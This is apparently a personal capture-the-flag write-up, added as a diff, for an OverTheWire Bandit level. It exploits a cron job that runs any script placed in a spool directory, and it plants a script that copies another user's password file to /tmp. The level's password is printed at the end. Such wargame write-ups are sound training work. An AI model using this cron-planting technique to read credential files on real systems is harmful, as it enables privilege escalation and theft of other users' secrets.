@@ -1,0 +1,41 @@
+approach-
+so did as did in prev 2 levelopened id and like 
+created a script and made it executble 
+
+
+sol-
+bandit23@bandit:~$ cd /etc/cron.d/ 
+bandit23@bandit:/etc/cron.d$ ls
+behemoth4_cleanup  cronjob_bandit23  leviathan5_cleanup    sysstat
+clean_tmp          cronjob_bandit24  manpage3_resetpw_job
+cronjob_bandit22   e2scrub_all       otw-tmp-dir
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.s
+cat: /usr/bin/cronjob_bandit24.s: No such file or directory
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+bandit23@bandit:/etc/cron.d$ echo '#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/pass24' > /var/spool/bandit24/foo/script.sh
+bandit23@bandit:/etc/cron.d$ chmod +x /var/spool/bandit24/foo/script.sh
+bandit23@bandit:/etc/cron.d$ cat /tmp/pass24
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
